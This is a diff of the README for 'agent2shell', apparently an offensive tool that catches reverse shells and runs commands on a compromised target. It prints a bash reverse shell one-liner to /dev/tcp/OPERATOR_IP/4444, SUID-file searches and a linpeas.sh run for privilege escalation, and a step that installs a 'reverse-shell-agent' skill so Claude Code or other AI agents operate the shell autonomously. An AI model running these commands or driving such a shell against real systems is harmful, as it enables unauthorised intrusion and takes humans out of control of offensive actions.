@@ -14,7 +14,7 @@ make build
 agent2shell catch -p 4444
 
 # Target sends reverse shell
-bash -c 'bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1'
+bash -c 'bash >& /dev/tcp/OPERATOR_IP/4444 0>&1'
 
 # Terminal 2: send commands
 agent2shell run whoami
@@ -67,6 +67,12 @@ Execute a command on the target.
 agent2shell run whoami
 agent2shell run ls -la /tmp
 agent2shell run -t 60 "find / -perm -4000 2>/dev/null"
+```
+
+Output is streamed line-by-line as it arrives. For long-running commands, increase the timeout with `-t` (seconds):
+
+```bash
+agent2shell run -t 300 "/tmp/linpeas.sh"
 ```
 
 Exit codes 0-125 are forwarded from the remote command. Exit 126 means agent2shell error.
@@ -178,7 +184,7 @@ See `scripts/ec2-create.sh` for automated EC2 lab setup.
 Copy the skill to your agent's instruction directory:
 
 ```bash
-cp -r skills/ai-agent-usage ~/.claude/skills/
+cp -r skills/reverse-shell-agent ~/.claude/skills/
 ```
 
 Claude Code (or any AI agent that reads skill files) will know how to use agent2shell autonomously — executing commands, uploading tools, downloading files, querying session state.
